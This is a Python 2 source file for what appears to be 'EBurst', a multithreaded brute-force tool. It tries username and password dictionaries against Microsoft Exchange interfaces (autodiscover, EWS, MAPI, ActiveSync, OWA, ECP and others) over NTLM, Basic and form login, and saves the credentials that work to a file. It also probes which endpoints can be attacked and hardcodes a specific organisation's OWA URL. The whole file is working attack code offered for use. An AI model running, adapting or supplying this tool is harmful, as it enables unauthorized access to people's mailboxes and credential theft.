# -*- coding: utf-8 -*-
import urllib2, requests, optparse, time, threading, Queue, sys, certifi
from base64 import encodestring
from requests_ntlm import HttpNtlmAuth
from lib.consle_width import getTerminalSize


class Check_Exchange_User:
    def __init__(self, domain, type=None, protocol=None, user=None, userfile=None, password=None, passfile=None,
                 thread=10):
        self.domain, self.user, self.userfile, self.password, self.passfile, self.thread = domain, user, userfile, password, passfile, thread
        self.URL = {
            "autodiscover":
                {"url": "%s://%s/autodiscover" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "ews":
                {"url": "%s://%s/ews" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "mapi":
                {"url": "%s://%s/mapi" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "activesync":
                {"url": "%s://%s/Microsoft-Server-ActiveSync" % ("http" if protocol == "http" else "https", domain),
                 "mode": "Basic"},
            "oab":
                {"url": "%s://%s/oab" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "rpc":
                {"url": "%s://%s/rpc" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "api":
                {"url": "%s://%s/api" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "owa":
                {"url": "%s://%s/owa/auth.owa" % ("http" if protocol == "http" else "https", domain), "mode": "HTTP"},
            "powershell":
                {"url": "%s://%s/powershell" % ("http" if protocol == "http" else "https", domain), "mode": "Kerberos"},
            "ecp":
                {"url": "%s://%s/owa/auth.owa" % ("http" if protocol == "http" else "https", domain), "mode": "HTTP"}
        }
        self.HEADERS = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:69.0) Gecko/20100101 Firefox/69.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
        }
        if not user and not userfile:
            return

        self.ReqInfo = self.URL[type]
        self.users = []

        # 多线程框架
        self.thread_count = 0
        self.scan_count = self.found_count = 0
        self.lock = threading.Lock()
        self.console_width = getTerminalSize()[0] - 2
        self.msg_queue = Queue.Queue()
        self.STOP_ME = False
        threading.Thread(target=self._print_msg).start()
        # 导入字段用户
        self._load_dict()
        # 结果存储
        outfile = domain + '.txt'
        self.outfile = open(outfile, 'w')

    # NTLM认证验证
    def check_NTLM_userpass(self, user, password, url):
        try:
            response = requests.get(url, auth=HttpNtlmAuth(user, password), headers=self.HEADERS)
            if 401 != response.status_code and 408 != response.status_code and 504 != response.status_code:
                return True
            else:
                return False

        except:
            return False

    # Basic认证验证
    def check_Basic_userpass(self, user, password, url):
        try:
            HEADERS = self.HEADERS
            HEADERS["Authorization"] = "Basic %s" % encodestring('%s:%s' % (user, password))[:-1]
            request = requests.session()
            request.keep_alive = False
            response = request.get(url, headers=HEADERS)
            if 401 != response.status_code and 408 != response.status_code and 504 != response.status_code:
                return True
            else:
                return False
        except:
            return False

    # http认证验证
    def check_HTTP_userpass(self, user, password, url, type="ecp"):
        try:
            if type == "owa":
                urldata = "https://mail.netone.co.zw/owa/"
            else:
                urldata = "https://mail.netone.co.zw/cep/"
            HEADERS = self.HEADERS
            HEADERS["Cache-Control"] = "max-age=0"
            HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
            HEADERS[
                "Referer"] = "https://" + self.domain + "/owa/auth/logon.aspx?replaceCurrent=1&url=" + urldata
            HEADERS["Cookie"] = "PrivateComputer=true; PBack=0"

            data = {
                "destination": urldata,
                "flags": "4",
                "forcedownlevel": "0",
                "username": user,
                "password": password,
                "passwordText": "",
                "isUtf8": "1"
            }
            request = requests.session()
            request.keep_alive = False
            response = request.post(url, data=data, headers=HEADERS, allow_redirects=False)
            if "Location" not in response.headers:
                return False
            if "reason" not in response.headers["Location"]:
                return True
            else:
                return False
        except:
            return False


    # 爆破exchange接口
    def check_Exchange_Interfac(self, user, password):
        url, mode = self.ReqInfo["url"], self.ReqInfo["mode"]
        if mode == "NTLM":
            if self.check_NTLM_userpass(user, password, url):
                return True
        elif mode == "Basic":
            if self.check_Basic_userpass(user, password, url):
                return True
        elif mode == "HTTP":
            type = "owa" if "/owa" in self.ReqInfo['url'] else "ecp"
            if self.check_HTTP_userpass(user, password, url, type=type):
                return True


    # 导入爆破字典字典
    def _load_dict(self):
        self.msg_queue.put('[+] Initializing, load user pass...')
        self.queue = Queue.Queue()
        userdict, passdict = [], []

        if self.userfile:
            with open(self.userfile) as f:
                for line in f:
                    userdict.append(line.strip())
        else:
            userdict.append(self.user.strip())

        if self.password:
            passdict.append(self.password.strip())
        else:
            with open(self.passfile) as f:
                for line in f:
                    passdict.append(line.strip())

        for user in userdict:
            for passwd in passdict:
                dic = {"user": user, "passwd": passwd}
                self.queue.put(dic)

        sys.stdout.write('\n')
        self.msg_queue.put('[+] Found dict infos %s/%s in total' % (len(userdict), len(passdict)))


    def _print_msg(self):
        while not self.STOP_ME:
            try:
                _msg = self.msg_queue.get(timeout=0.1)
            except:
                continue

            if _msg == 'status':
                msg = '%s Found| %s groups| %s scanned in %.1f seconds| %s threads' % (
                    self.found_count, self.queue.qsize(), self.scan_count, time.time() - self.start_time,
                    self.thread_count)
                sys.stdout.write('\r' + ' ' * (self.console_width - len(msg)) + msg)
            elif _msg.startswith('[+] Check user pass Info'):
                sys.stdout.write('\r' + _msg + ' ' * (self.console_width - len(_msg)))
            else:
                sys.stdout.write('\r' + _msg + ' ' * (self.console_width - len(_msg)) + '\n')
            sys.stdout.flush()


    def _update_scan_count(self):
        self.last_scanned = time.time()
        self.scan_count += 1


    def _update_found_count(self):
        self.found_count += 1


    # 验证接口有效性，判断是否存在接口爆破的可能
    def check_interfac_availab(self):
        for (k, v) in self.URL.items():
            url = v["url"]
            request = requests.session()
            request.keep_alive = False
            try:
                response = request.get(url, headers=self.HEADERS, allow_redirects=False)
                if 404 != response.status_code and 301 != response.status_code and 302 != response.status_code and 403 != response.status_code:
                    print u"URL: %s ,code:%s" % (url, response.status_code) + u"\t有效可以爆破"
                else:
                    print u"URL: %s ,code:%s" % (url, response.status_code) + u"\t失败无法爆破"
            except:
                print "URL: %s ,Fail"


    # 检测接口认证方式开通了哪些，并替换为已开通的方式
    def check_url_authenticate(self):
        self.msg_queue.put('[+] Find target url authenticate method ...')
        url = self.ReqInfo["url"]
        mode = self.ReqInfo["mode"]
        if mode == "HTTP":
            return True

        request = requests.session()
        request.keep_alive = False
        response = request.get(url, headers=self.HEADERS)
        authenticate_type = response.headers["WWW-Authenticate"]
        # 认证方式不为默认类型，则替换为支持的类型
        if mode not in authenticate_type:
            if "NTLM" in authenticate_type:
                self.ReqInfo["mode"] = "NTLM"
            elif "Basic" in authenticate_type:
                self.ReqInfo["mode"] = "Basic"
            else:
                return False
        return True


    # 开始多线程扫描
    def _scan(self):
        self.lock.acquire()
        self.thread_count += 1
        self.lock.release()
        while not self.STOP_ME:
            try:
                lst_info = self.queue.get(timeout=0.1)
            except Queue.Empty:
                break

            while not self.STOP_ME:
                self._update_scan_count()
                self.msg_queue.put('status')
                if self.check_Exchange_Interfac(lst_info["user"], lst_info["passwd"]):
                    self._update_found_count()
                    msg = ("success user: %s ，password: %s" % (lst_info["user"], lst_info["passwd"])).ljust(30)
                    self.msg_queue.put(msg)
                    self.msg_queue.put('status')
                    self.outfile.write(msg + '\n')
                    self.outfile.flush()
                break

        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()
        self.msg_queue.put('status')


    def run(self):
        # 验证url的认证类型
        if not self.check_url_authenticate():
            self.msg_queue.put('[+] Unsupport authentication method, system return')
            return

        self.msg_queue.put('[+] start scan ...')
        self.start_time = time.time()
        for i in range(self.thread):
            try:
                t = threading.Thread(target=self._scan, name=str(i))
                t.setDaemon(True)
                t.start()
            except:
                pass
        while self.thread_count > 0:
            try:
                time.sleep(1.0)
            except KeyboardInterrupt, e:
                msg = '[WARNING] User aborted, wait all slave threads to exit...'
                sys.stdout.write('\r' + msg + ' ' * (self.console_width - len(msg)) + '\n\r')
                sys.stdout.flush()
                self.STOP_ME = True
        self.STOP_ME = True


if __name__ == '__main__':
    parser = optparse.OptionParser()

    parser.add_option("-d", dest="domain", help=u"邮箱地址")
    parser.add_option("-L", dest="userfile", help=u"用户文件")
    parser.add_option("-P", dest="passfile", help=u"密码文件")
    parser.add_option("-l", dest="user", help=u"指定用户名")
    parser.add_option("-p", dest="password", help=u"指定密码")
    parser.add_option("-T", "--t", dest="thread", type="int", default=100, help=u"线程数量，默认为100")
    parser.add_option("-C", "--c", dest="check", default=False, action='store_true', help=u"验证各接口是否存在爆破的可能性")
    parser.add_option("--protocol", dest="protocol", action='store_true', help=u"通讯协议默认https，demo: --protocol http")

    group = optparse.OptionGroup(parser, "type", u"EBurst 扫描所用的接口")
    group.add_option("--autodiscover", dest="autodiscover", default=True, action='store_true',
                     help=u"autodiscover接口，默认NTLM认证方式，自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。")
    group.add_option("--ews", dest="ews", default=False, action='store_true',
                     help=u"ews接口，默认NTLM认证方式，Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互")
    group.add_option("--mapi", dest="mapi", default=False, action='store_true',
                     help=u"mapi接口，默认NTLM认证方式，Outlook连接Exchange的默认方式，在2013和2013之后开始使用，2010 sp2同样支持")
    group.add_option("--activesync", dest="activesync", default=False, action='store_true',
                     help=u"activesync接口，默认Basic认证方式，用于移动应用程序访问电子邮件")
    group.add_option("--oab", dest="oab", default=False, action='store_true',
                     help=u"oab接口，默认NTLM认证方式，用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担")
    group.add_option("--rpc", dest="rpc", default=False, action='store_true',
                     help=u"rpc接口，默认NTLM认证方式，早期的Outlook还使用称为Outlook Anywhere的RPC交互")
    group.add_option("--api", dest="api", default=False, action='store_true', help=u"api接口，默认NTLM认证方式")
    group.add_option("--owa", dest="owa", default=False, action='store_true',
                     help=u"owa接口，默认http认证方式，Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等")
    group.add_option("--powershell", dest="powershell", default=False, action='store_true',
                     help=u"powershell接口（暂不支持），默认Kerberos认证方式，用于服务器管理的Exchange管理控制台")
    group.add_option("--ecp", dest="ecp", default=False, action='store_true',
                     help=u"ecp接口，默认http认证方式，Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台")
    parser.add_option_group(group)

    options, _ = parser.parse_args()

    if (options.userfile or options.user) and (options.passfile or options.password) and (options.domain):
        type = "autodiscover"
        if options.ews:
            type = "ews"
        elif options.mapi:
            type = "mapi"
        elif options.activesync:
            type = "activesync"
        elif options.oab:
            type = "oab"
        elif options.rpc:
            type = "rpc"
        elif options.api:
            type = "api"
        elif options.owa:
            type = "owa"
        elif options.powershell:
            type = "powershell"
        elif options.ecp:
            type = "ecp"

        scan = Check_Exchange_User(options.domain,
                                   type,
                                   options.protocol,
                                   options.user,
                                   options.userfile,
                                   options.password,
                                   options.passfile,
                                   options.thread)
        scan.run()
        scan.outfile.flush()
        scan.outfile.close()
    elif options.check and options.domain:
        Check_Exchange_User(options.domain).check_interfac_availab()
    else:
        parser.print_help()
